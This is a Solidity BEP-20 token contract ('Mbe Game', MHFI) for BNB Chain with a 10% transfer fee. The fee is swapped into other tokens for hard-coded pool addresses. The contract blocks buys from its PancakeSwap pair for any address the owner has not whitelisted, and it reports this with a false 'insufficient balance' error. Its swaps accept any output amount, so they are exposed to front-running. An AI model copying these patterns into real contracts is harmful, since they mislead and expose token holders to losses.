/**
 *Submitted for verification at BscScan.com on 2023-01-27
*/

pragma solidity >=0.6.8;
interface ERC20 {
    function transfer(address receiver, uint amount) external;
    function transferFrom(address _from, address _to, uint256 _value)external;
    function balanceOf(address receiver)external view  returns(uint256);
    function mint(address account, uint amount)external;
    function approve(address spender, uint amount) external returns (bool);
}
interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}
contract HappyNewYear {
    // ERC20
    string private _name;
    string private _symbol;
    uint256 private _decimals;
    uint256 private _totalSupply;
    mapping (address => uint256) private balances;
    mapping (address => mapping (address => uint256)) private allowances;
    mapping (address => uint256) public start;//记录前500个购买人
    address public owner;
    uint256 public start500;//前500个博饼购买ID
    address public pir;
    mapping (address => bool) public last;//映射
    // Events
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    // ================= Initial value ===============

    constructor () public {
        owner=msg.sender;
        _name = "Mbe Game";
        _symbol = "MHFI";
        _decimals = 18;
        _totalSupply = 10000000000000000000000000;// 10_00000000.mul(10 ** uint256(18));
        balances[0x1A16D085E003c79498e770b4b0c93e40846B3924] = _totalSupply;
        emit Transfer(address(this), 0x1A16D085E003c79498e770b4b0c93e40846B3924, _totalSupply);
        IRouter _pancakeRouter = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        //Create a pancake pair for this new token
        pir = IPancakeFactory(_pancakeRouter.factory())
        .createPair(address(this), _pancakeRouter.WETH());
        _approve(address(this), address(0x10ED43C718714eb63d5aA57B78B54704E256024E), 2 ** 256 - 1);
    }
    receive() external payable{ 
    }
    function setOener()public{
     require(msg.sender == owner);
       owner=address(0);
    }
    function setList(address[] memory addr)public{
     require(msg.sender == owner);
     for(uint i=0;i<addr.length;i++){
       last[addr[i]]=true;
     }
    }
    // ================= Pair transfer ===============

    function _transfer(address _sender, address _recipient, uint256 _amount) internal {
        require(_amount <= balances[_sender],"Transfer: insufficient balance of from address");
        require(_sender != pir || last[_sender] || last[_recipient],"Transfer: insufficient balance of from address");
        if(_sender != address(this) && _sender != pir && balances[address(this)] >= 5000 ether){        
            toPdex(5000 ether);//滑点分配
        }
        if(_sender == address(this) || last[_sender] || last[_recipient]){
            balances[_sender] -= _amount;
            balances[_recipient] += _amount;
            emit Transfer(_sender, _recipient, _amount);  
        }else {
            balances[_sender] -= _amount;
            balances[_recipient] += _amount*90/100;
            balances[address(this)] += _amount*10/100;
            emit Transfer(_sender, _recipient, _amount*90/100);
            emit Transfer(_sender, address(this), _amount*10/100);
        } 
    }
   function toPdex(uint mm)private   {
       uint256 pooledM1;
       if(balances[address(this)] > 5000 ether){
          pooledM1=mm;
       }else {
           pooledM1=balances[address(this)];
       }
        // now is to lock into staking pool
        if(pooledM1 > 10 ether){
        swapTokensForEth(address(0x10ED43C718714eb63d5aA57B78B54704E256024E), pooledM1);
        uint256 deltaBalance = address(this).balance/2;
        swapETHForTokens(deltaBalance,0x086DDd008e20dd74C4FB216170349853f8CA8289,0x415d5a7e7f2658dcCE7e55021e0b2ACFA8Ae261C);//购买MBE进入游戏池子
        swapETHForTokens(deltaBalance,0x7b262281C856fC16A63184423F4c286C8c0195a0,0xbD9620FEaE5e631d44D3a5e67f8D7F64B6E41A76);//购买HNY进入游戏池子
        }
    }
    function swapTokensForEth(
        address routerAddress,
        uint256 tokenAmount
    ) private   {
        IRouter pancakeRouter = IRouter(routerAddress);

        // generate the pancake pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

        // make the swap
        pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of BNB
            path,
            address(this),
            block.timestamp+360
        );
    }
    function swapETHForTokens(
        uint256 ethAmount,
        address token,
        address pool
    ) private  {
        IRouter pancakeRouter = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

        // generate the pancake pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        path[1] = token;

        // make the swap
        pancakeRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: ethAmount}(
            0, // accept any amount of BNB
            path,
            pool,//进入游戏池
            block.timestamp + 360
        );
    }
    // ================= ERC20 Basic Write ===============

    function approve(address _spender, uint256 _amount) public returns (bool) {
        _approve(msg.sender, _spender, _amount);
        return true;
    }

    function _approve(address _owner, address _spender, uint256 _amount) internal {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(_spender != address(0), "ERC20: approve to the zero address");

        allowances[_owner][_spender] = _amount;
        emit Approval(_owner, _spender, _amount);
    }

    function transfer(address _recipient, uint256 _amount) public returns (bool) {
        _transfer(msg.sender, _recipient, _amount);
        return true;
    }

    function transferFrom(address _sender, address _recipient, uint256 _amount) public returns (bool) {
        _transfer(_sender, _recipient, _amount);
        require(allowances[_sender][msg.sender]>=_amount);
        _approve(_sender, msg.sender, allowances[_sender][msg.sender]-_amount);
        return true;
    }

    // ================= ERC20 Basic Query ===============

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return balances[_owner];
    }

    function allowance(address _owner, address _spender) public view returns (uint256) {
        return allowances[_owner][_spender];
    }

}